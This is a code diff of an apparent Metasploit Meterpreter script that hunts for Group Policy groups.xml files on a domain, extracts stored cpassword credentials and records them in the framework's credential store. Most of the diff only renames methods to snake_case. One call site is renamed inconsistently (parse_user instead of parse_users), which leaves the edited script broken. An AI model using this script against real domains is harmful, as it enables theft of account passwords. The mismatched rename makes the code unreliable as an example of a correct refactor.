@@ -35,7 +35,7 @@ end
 
 LocalUser = Struct.new(:name, :cpassword, :action, :changeLogon, :noChange,
 							:neverExpires, :acctDisabled, :subAuthority, :changed)
-def parseUsers(text)
+def parse_users(text)
 	# parse the xml to find all users.
 	doc = (REXML::Document.new text).root
 	doc.elements.to_a("//User/Properties").each do |p|
@@ -56,14 +56,14 @@ def parseUsers(text)
 	end
 end
 
-def scanGroupsFile(groupsfile)
+def scan_groups_file(groupsfile)
 	# read the groups.xml
 	begin
 		if client.fs.file.stat(groupsfile).file?
 			rfile = client.fs.file.new(groupsfile)
 			temp = rfile.read
 			# parse xml
-			parseUsers(temp) { |localuser|
+			parse_user(temp) { |localuser|
 				## store_creds
 				client.framework.db.report_auth_info(
 					:host  => client.sock.peerhost,
@@ -81,7 +81,7 @@ def scanGroupsFile(groupsfile)
 	end
 end
 
-def searchGroupsFile(path)
+def search_groups_file(path)
 	# search all groups.xml
 	begin
 		dirs = client.fs.dir.foreach(path)
@@ -117,7 +117,7 @@ end
 
 
 
-def scanPoliciesPath(server)
+def scan_policies_path(server)
 	#scan all policies
 	if server.nil?
 		server = get_domain_dc_url
@@ -138,8 +138,8 @@ def scanPoliciesPath(server)
 		fullpath = dirname +  dom + '\\' + "Policies"
 
 		if client.fs.file.stat(fullpath).directory?
-			searchGroupsFile(fullpath) { |groupsfile|
-				scanGroupsFile groupsfile
+			search_groups_file(fullpath) { |groupsfile|
+				scan_groups_file groupsfile
 			}
 		end
 	end
@@ -178,7 +178,7 @@ if client.platform =~ /win32|win64/
 		return
 	end
 
-	scanPoliciesPath(server)
+	scan_policies_path(server)
 else
 	print_error("This version of Meterpreter is not supported with this Script!")
 	raise Rex::Script::Completed
